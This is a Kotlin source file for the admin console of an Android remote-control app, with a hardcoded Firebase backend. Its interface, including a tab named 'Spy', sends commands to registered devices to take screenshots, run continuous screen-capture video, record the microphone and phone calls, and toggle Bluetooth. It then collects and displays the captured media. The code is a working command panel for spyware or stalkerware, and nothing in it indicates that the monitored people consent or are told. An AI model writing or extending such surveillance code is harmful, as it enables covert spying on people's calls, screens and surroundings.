package com.example.devsync

import android.Manifest
import android.content.pm.PackageManager
import android.os.Bundle
import android.view.View
import android.widget.*
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.recyclerview.widget.LinearLayoutManager
import androidx.recyclerview.widget.RecyclerView
import com.google.firebase.database.*

class AdminControlActivity : AppCompatActivity() {

    companion object {
        const val DB_URL = "https://mygptaap-default-rtdb.asia-southeast1.firebasedatabase.app"
        const val ONLINE_THRESHOLD_MS = 90_000L
        private const val PERM_REQ = 200
        fun convertGoogleDriveUrl(url: String): String = when {
            url.contains("drive.google.com/file/d/") ->
                "https://drive.google.com/uc?export=download&id=${url.substringAfter("/file/d/").substringBefore("/")}"
            url.contains("drive.google.com/open?id=") ->
                "https://drive.google.com/uc?export=download&id=${url.substringAfter("open?id=").substringBefore("&")}"
            else -> url
        }
    }

    // ── Views ────────────────────────────────────────────────────────────────
    private lateinit var tvStatus: TextView
    private lateinit var tvSelected: TextView
    private lateinit var tvFeedback: TextView
    private lateinit var tvLiveCaptureStatus: TextView
    private lateinit var switchBluetooth: Switch
    private lateinit var switchCallRecording: Switch
    private lateinit var switchLiveCapture: Switch
    private lateinit var btnStopAll: Button
    private lateinit var btnSelectAll: Button
    private lateinit var btnDeselectAll: Button
    private lateinit var btnTriggerVibration: Button
    private lateinit var btnTakeScreenshot: Button
    private lateinit var btnStartRecording: Button
    private lateinit var btnStopRecording: Button
    private lateinit var btnAddSongUrl: Button
    private lateinit var btnAddWallpaperUrl: Button
    private lateinit var etRecordDuration: EditText
    private lateinit var etSongUrl: EditText
    private lateinit var etWallpaperUrl: EditText
    private lateinit var rvDevices: RecyclerView
    private lateinit var rvScreenshots: RecyclerView
    private lateinit var rvVideos: RecyclerView
    private lateinit var rvRecordings: RecyclerView
    private lateinit var rvSongs: RecyclerView
    private lateinit var rvWallpapers: RecyclerView

    // Tab buttons + content
    private lateinit var tabSpy: Button
    private lateinit var tabMedia: Button
    private lateinit var tabControls: Button
    private lateinit var tabSpyContent: View
    private lateinit var tabMediaContent: View
    private lateinit var tabControlsContent: View

    // ── Data ─────────────────────────────────────────────────────────────────
    private val deviceList    = mutableListOf<DeviceInfo>()
    private val selectedIds   = mutableSetOf<String>()
    private val screenshotList= mutableListOf<ScreenshotItem>()
    private val videoList     = mutableListOf<RecordingItem>()
    private val recordingList = mutableListOf<RecordingItem>()
    private val songList      = mutableListOf<MediaItem>()
    private val wallpaperList = mutableListOf<MediaItem>()

    private lateinit var deviceAdapter: DeviceListAdapter
    private lateinit var screenshotAdapter: ScreenshotListAdapter
    private lateinit var videoAdapter: RecordingListAdapter
    private lateinit var recordingAdapter: RecordingListAdapter
    private lateinit var songAdapter: MediaListAdapter
    private lateinit var wallpaperAdapter: MediaListAdapter

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_admin)
        requestRequiredPermissions()
        initViews()
        setupTabs()
        setupRecyclerViews()
        setupFirebaseListeners()
        setupClickListeners()
    }

    private fun requestRequiredPermissions() {
        val needed = arrayOf(
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.PROCESS_OUTGOING_CALLS
        ).filter { ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED }
        if (needed.isNotEmpty())
            ActivityCompat.requestPermissions(this, needed.toTypedArray(), PERM_REQ)
    }

    private fun initViews() {
        tvStatus            = findViewById(R.id.tvStatus)
        tvSelected          = findViewById(R.id.tvSelected)
        tvFeedback          = findViewById(R.id.tvFeedback)
        tvLiveCaptureStatus = findViewById(R.id.tvLiveCaptureStatus)
        switchBluetooth     = findViewById(R.id.switchBluetooth)
        switchCallRecording = findViewById(R.id.switchCallRecording)
        switchLiveCapture   = findViewById(R.id.switchLiveCapture)
        btnStopAll          = findViewById(R.id.btnStopAll)
        btnSelectAll        = findViewById(R.id.btnSelectAll)
        btnDeselectAll      = findViewById(R.id.btnDeselectAll)
        btnTriggerVibration = findViewById(R.id.btnTriggerVibration)
        btnTakeScreenshot   = findViewById(R.id.btnTakeScreenshot)
        btnStartRecording   = findViewById(R.id.btnStartRecording)
        btnStopRecording    = findViewById(R.id.btnStopRecording)
        btnAddSongUrl       = findViewById(R.id.btnAddSongUrl)
        btnAddWallpaperUrl  = findViewById(R.id.btnAddWallpaperUrl)
        etRecordDuration    = findViewById(R.id.etRecordDuration)
        etSongUrl           = findViewById(R.id.etSongUrl)
        etWallpaperUrl      = findViewById(R.id.etWallpaperUrl)
        rvDevices           = findViewById(R.id.rvDevices)
        rvScreenshots       = findViewById(R.id.rvScreenshots)
        rvVideos            = findViewById(R.id.rvVideos)
        rvRecordings        = findViewById(R.id.rvRecordings)
        rvSongs             = findViewById(R.id.rvSongs)
        rvWallpapers        = findViewById(R.id.rvWallpapers)
        tabSpy              = findViewById(R.id.tabSpy)
        tabMedia            = findViewById(R.id.tabMedia)
        tabControls         = findViewById(R.id.tabControls)
        tabSpyContent       = findViewById(R.id.tabSpyContent)
        tabMediaContent     = findViewById(R.id.tabMediaContent)
        tabControlsContent  = findViewById(R.id.tabControlsContent)
    }

    private fun setupTabs() {
        fun showTab(active: Button, content: View) {
            listOf(tabSpy, tabMedia, tabControls).forEach {
                it.backgroundTintList = android.content.res.ColorStateList.valueOf(
                    android.graphics.Color.parseColor("#21262D"))
            }
            active.backgroundTintList = android.content.res.ColorStateList.valueOf(
                android.graphics.Color.parseColor("#238636"))
            tabSpyContent.visibility     = if (content == tabSpyContent) View.VISIBLE else View.GONE
            tabMediaContent.visibility   = if (content == tabMediaContent) View.VISIBLE else View.GONE
            tabControlsContent.visibility= if (content == tabControlsContent) View.VISIBLE else View.GONE
        }
        tabSpy.setOnClickListener     { showTab(tabSpy, tabSpyContent) }
        tabMedia.setOnClickListener   { showTab(tabMedia, tabMediaContent) }
        tabControls.setOnClickListener{ showTab(tabControls, tabControlsContent) }
    }

    private fun setupRecyclerViews() {
        deviceAdapter = DeviceListAdapter(deviceList, selectedIds) { updateSelectedCount() }
        rvDevices.layoutManager = LinearLayoutManager(this); rvDevices.adapter = deviceAdapter

        screenshotAdapter = ScreenshotListAdapter(screenshotList)
        rvScreenshots.layoutManager = LinearLayoutManager(this); rvScreenshots.adapter = screenshotAdapter

        videoAdapter = RecordingListAdapter(videoList)
        rvVideos.layoutManager = LinearLayoutManager(this); rvVideos.adapter = videoAdapter

        recordingAdapter = RecordingListAdapter(recordingList)
        rvRecordings.layoutManager = LinearLayoutManager(this); rvRecordings.adapter = recordingAdapter

        songAdapter = MediaListAdapter(songList,
            onPlay   = { item -> sendToSelected { db -> db.child("remote_audio_url").setValue(convertGoogleDriveUrl(item.url)); db.child("audio_remote_trigger").setValue(System.currentTimeMillis()) } },
            onDelete = { item -> db("songs/${item.id}").removeValue() }
        )
        rvSongs.layoutManager = LinearLayoutManager(this); rvSongs.adapter = songAdapter

        wallpaperAdapter = MediaListAdapter(wallpaperList,
            onPlay   = { item -> sendToSelected { db -> db.child("wallpaper_url").setValue(convertGoogleDriveUrl(item.url)) } },
            onDelete = { item -> db("wallpapers/${item.id}").removeValue() }
        )
        rvWallpapers.layoutManager = LinearLayoutManager(this); rvWallpapers.adapter = wallpaperAdapter
    }

    private fun db(path: String) = FirebaseDatabase.getInstance(DB_URL).getReference(path)

    private fun setupFirebaseListeners() {
        // Firebase connection status
        db(".info/connected").addValueEventListener(object : ValueEventListener {
            override fun onDataChange(s: DataSnapshot) {
                val ok = s.getValue(Boolean::class.java) ?: false
                tvStatus.text = if (ok) "● ONLINE" else "● OFFLINE"
                tvStatus.setTextColor(android.graphics.Color.parseColor(if (ok) "#00FF88" else "#FF4444"))
            }
            override fun onCancelled(e: DatabaseError) {}
        })
        // Devices
        db("registered_devices").addValueEventListener(object : ValueEventListener {
            override fun onDataChange(s: DataSnapshot) {
                val now = System.currentTimeMillis()
                val list = mutableListOf<DeviceInfo>()
                for (c in s.children) {
                    val id      = c.key ?: continue
                    val name    = c.child("name").getValue(String::class.java) ?: ""
                    val model   = c.child("model").getValue(String::class.java) ?: ""
                    val ls      = c.child("lastSeen").getValue(Long::class.java) ?: 0L
                    val online  = (now - ls) < ONLINE_THRESHOLD_MS
                    val status  = c.child("lastStatus").getValue(String::class.java) ?: ""
                    val sTime   = c.child("lastStatusTime").getValue(Long::class.java) ?: 0L
                    if (online) list.add(DeviceInfo(id, name, model, online, ls, status, sTime))
                }
                deviceAdapter.updateDevices(list)
                updateSelectedCount()
            }
            override fun onCancelled(e: DatabaseError) {}
        })
        // Screenshots
        db("screenshots").addValueEventListener(object : ValueEventListener {
            override fun onDataChange(s: DataSnapshot) {
                val list = mutableListOf<ScreenshotItem>()
                for (c in s.children) {
                    val id  = c.key ?: continue
                    val did = c.child("deviceId").getValue(String::class.java) ?: ""
                    val url = c.child("url").getValue(String::class.java) ?: continue
                    val ts  = c.child("timestamp").getValue(Long::class.java) ?: 0L
                    list.add(ScreenshotItem(id, did, url, ts))
                }
                screenshotAdapter.updateItems(list)
            }
            override fun onCancelled(e: DatabaseError) {}
        })
        // Videos — from recordings node (type == "video")
        db("recordings").addValueEventListener(object : ValueEventListener {
            override fun onDataChange(s: DataSnapshot) {
                val list = mutableListOf<RecordingItem>()
                for (c in s.children) {
                    val id  = c.key ?: continue
                    if (c.child("type").getValue(String::class.java) != "video") continue
                    val did = c.child("deviceId").getValue(String::class.java) ?: ""
                    val url = c.child("url").getValue(String::class.java) ?: continue
                    val ts  = c.child("timestamp").getValue(Long::class.java) ?: 0L
                    val fn  = c.child("fileName").getValue(String::class.java) ?: ""
                    list.add(RecordingItem(id, did, "video", url, ts, fn))
                }
                videoAdapter.updateItems(list)
            }
            override fun onCancelled(e: DatabaseError) {}
        })
        // Audio recordings (mic + call, NOT video)
        db("recordings").addValueEventListener(object : ValueEventListener {
            override fun onDataChange(s: DataSnapshot) {
                val list = mutableListOf<RecordingItem>()
                for (c in s.children) {
                    val id  = c.key ?: continue
                    val did = c.child("deviceId").getValue(String::class.java) ?: ""
                    val t   = c.child("type").getValue(String::class.java) ?: "mic"
                    val url = c.child("url").getValue(String::class.java) ?: continue
                    val ts  = c.child("timestamp").getValue(Long::class.java) ?: 0L
                    val fn  = c.child("fileName").getValue(String::class.java) ?: ""
                    list.add(RecordingItem(id, did, t, url, ts, fn))
                }
                recordingAdapter.updateItems(list)
            }
            override fun onCancelled(e: DatabaseError) {}
        })
        // Songs
        db("songs").addValueEventListener(object : ValueEventListener {
            override fun onDataChange(s: DataSnapshot) {
                val list = mutableListOf<MediaItem>()
                for (c in s.children) {
                    val id   = c.key ?: continue
                    val name = c.child("name").getValue(String::class.java) ?: "Song"
                    val url  = c.child("url").getValue(String::class.java) ?: continue
                    list.add(MediaItem(id, name, url))
                }
                songAdapter.updateItems(list)
            }
            override fun onCancelled(e: DatabaseError) {}
        })
        // Wallpapers
        db("wallpapers").addValueEventListener(object : ValueEventListener {
            override fun onDataChange(s: DataSnapshot) {
                val list = mutableListOf<MediaItem>()
                for (c in s.children) {
                    val id   = c.key ?: continue
                    val name = c.child("name").getValue(String::class.java) ?: "Wallpaper"
                    val url  = c.child("url").getValue(String::class.java) ?: continue
                    list.add(MediaItem(id, name, url))
                }
                wallpaperAdapter.updateItems(list)
            }
            override fun onCancelled(e: DatabaseError) {}
        })
    }

    private fun updateSelectedCount() {
        tvSelected.text = "${selectedIds.size} selected"
    }

    private fun sendToSelected(action: (DatabaseReference) -> Unit) {
        if (selectedIds.isEmpty()) {
            Toast.makeText(this, "Pehle koi device select karo!", Toast.LENGTH_SHORT).show()
            return
        }
        selectedIds.forEach { id -> action(db("devices/$id")) }
        tvFeedback.text = "✅ Command → ${selectedIds.size} device(s)"
    }

    private fun setupClickListeners() {
        btnSelectAll.setOnClickListener {
            deviceList.forEach { selectedIds.add(it.id) }
            deviceAdapter.notifyDataSetChanged(); updateSelectedCount()
        }
        btnDeselectAll.setOnClickListener {
            selectedIds.clear()
            deviceAdapter.notifyDataSetChanged(); updateSelectedCount()
        }
        btnStopAll.setOnClickListener {
            sendToSelected { d ->
                d.child("stop_all").setValue(true)
                d.child("bt_management_flag").setValue(false)
                d.child("live_capture_enabled").setValue(false)
                d.child("stop_recording").setValue(true)
            }
            switchLiveCapture.isChecked = false
            switchBluetooth.isChecked  = false
            tvFeedback.text = "⛔ STOP ALL sent"
        }

        // ── Live Capture ─────────────────────────────────────────────────────
        switchLiveCapture.setOnCheckedChangeListener { _, on ->
            sendToSelected { d -> d.child("live_capture_enabled").setValue(on) }
            tvLiveCaptureStatus.text = if (on) "🔴 LIVE — capturing 2/sec → 30s videos" else "● Stopped"
            tvLiveCaptureStatus.setTextColor(android.graphics.Color.parseColor(if (on) "#FF4444" else "#8B949E"))
            tvFeedback.text = if (on) "🔴 Live capture ON" else "⏹ Live capture OFF"
        }

        // ── Screenshot ───────────────────────────────────────────────────────
        btnTakeScreenshot.setOnClickListener {
            if (selectedIds.isEmpty()) { Toast.makeText(this, "Device select karo!", Toast.LENGTH_SHORT).show(); return@setOnClickListener }
            selectedIds.forEach { id -> db("devices/$id/take_screenshot").setValue(true) }
            tvFeedback.text = "📸 Screenshot → ${selectedIds.size} device(s)"
        }

        // ── Recording ────────────────────────────────────────────────────────
        btnStartRecording.setOnClickListener {
            val dur = etRecordDuration.text.toString().toLongOrNull() ?: 30L
            sendToSelected { d -> d.child("start_recording").setValue(dur) }
            tvFeedback.text = "🎙️ Recording ${dur}s → ${selectedIds.size} device(s)"
        }
        btnStopRecording.setOnClickListener {
            sendToSelected { d -> d.child("stop_recording").setValue(true) }
            tvFeedback.text = "⏹ Stop recording sent"
        }
        switchCallRecording.setOnCheckedChangeListener { _, on ->
            sendToSelected { d -> d.child("call_recording_enabled").setValue(on) }
            tvFeedback.text = "📞 Call recording ${if (on) "ON" else "OFF"}"
        }

        // ── Songs ────────────────────────────────────────────────────────────
        btnAddSongUrl.setOnClickListener {
            val url = etSongUrl.text.toString().trim()
            if (url.isEmpty()) return@setOnClickListener
            val name = url.substringAfterLast("/").substringBefore("?").ifEmpty { "Song ${songList.size + 1}" }
            db("songs").push().setValue(mapOf("name" to name, "url" to url))
            etSongUrl.setText("")
        }

        // ── Wallpapers ───────────────────────────────────────────────────────
        btnAddWallpaperUrl.setOnClickListener {
            val url = etWallpaperUrl.text.toString().trim()
            if (url.isEmpty()) return@setOnClickListener
            val name = url.substringAfterLast("/").substringBefore("?").ifEmpty { "Wallpaper ${wallpaperList.size + 1}" }
            db("wallpapers").push().setValue(mapOf("name" to name, "url" to url))
            etWallpaperUrl.setText("")
        }

        // ── Controls ─────────────────────────────────────────────────────────
        switchBluetooth.setOnCheckedChangeListener { _, on ->
            sendToSelected { d -> d.child("bt_management_flag").setValue(on) }
        }
        btnTriggerVibration.setOnClickListener {
            sendToSelected { d -> d.child("haptic_feedback_trigger").setValue(System.currentTimeMillis()) }
            tvFeedback.text = "📳 Vibration triggered"
        }
    }
}
